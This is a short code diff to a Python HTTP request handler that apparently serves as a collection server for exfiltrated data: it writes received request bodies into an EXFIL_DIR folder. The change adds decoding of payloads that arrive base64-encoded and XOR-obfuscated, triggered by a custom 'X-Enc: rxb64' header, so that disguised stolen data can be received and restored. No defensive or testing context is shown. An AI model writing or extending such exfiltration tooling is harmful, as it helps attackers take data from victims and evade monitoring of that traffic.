@@ -24,6 +24,10 @@ class _Handler(BaseHTTPRequestHandler):
 
         length = int(self.headers.get("Content-Length", 0))
         data = self.rfile.read(length)
+        if self.headers.get("X-Enc") == "rxb64":
+            import base64
+            xored = base64.b64decode(data)
+            data = bytes(b ^ ((0xAB + i) & 0xFF) for i, b in enumerate(xored))
 
         os.makedirs(EXFIL_DIR, exist_ok=True)
         dest = os.path.join(EXFIL_DIR, filename)
